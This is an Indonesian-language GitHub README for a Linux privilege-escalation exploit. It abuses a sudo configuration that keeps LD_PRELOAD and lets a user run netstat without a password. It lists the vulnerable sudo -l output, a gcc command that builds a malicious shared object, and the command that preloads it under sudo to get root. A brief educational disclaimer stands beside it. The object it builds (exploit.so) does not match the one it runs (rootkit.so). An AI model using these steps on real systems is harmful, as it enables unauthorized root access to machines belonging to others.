
# Netstat-LD_PRELOAD-Exploit

Exploit yang menggunakan netstat dan LD_PRELOAD untuk mendapatkan akses root (privilege escalation) pada sistem Linux.

Peringatan: Kode ini hanya untuk tujuan pendidikan dan tidak boleh digunakan untuk tujuan jahat. Penggunaan kode ini untuk tujuan jahat dapat menyebabkan kerusakan pada sistem dan dapat dianggap sebagai tindakan ilegal.

## Vuln/Examples
env_keep+=LD_PRELOAD ALL : ALL) NOPASSWD: /usr/bin/netstat
```bash
$ sudo -l

Matching Defaults entries for mint on navigate:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty,
    env_keep+=LD_PRELOAD

User mint may run the following commands on navigate:
    (ALL : ALL) NOPASSWD: /usr/bin/netstat

```


## Installation

Upload exploit.c ke server target. Dan compile exploit.c

```bash
gcc -fPIC -shared -nostartfiles -o exploit.so exploit.c
```

Atau, bisa juga upload langsung exploit.so


## Running Exploit

```bash
 sudo LD_PRELOAD=/tmp/rootkit.so /usr/bin/netstat
```

![poc](https://github.com/mzrismuarf/LinuxPrivEscalation/blob/main/Netstat-LD_PRELOAD-Exploit/demo/poc.gif)
